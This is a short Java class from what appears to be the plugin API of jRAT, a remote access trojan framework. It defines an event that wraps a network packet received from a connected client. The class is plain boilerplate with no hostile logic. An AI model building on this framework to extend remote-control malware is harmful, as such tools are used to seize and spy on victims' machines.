package jrat.api.events;

import jrat.api.Packet;
import jrat.api.Client;

public class OnPacketEvent extends RATObjectEvent {

	private final Packet packet;

	public OnPacketEvent(Client server, Packet packet) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
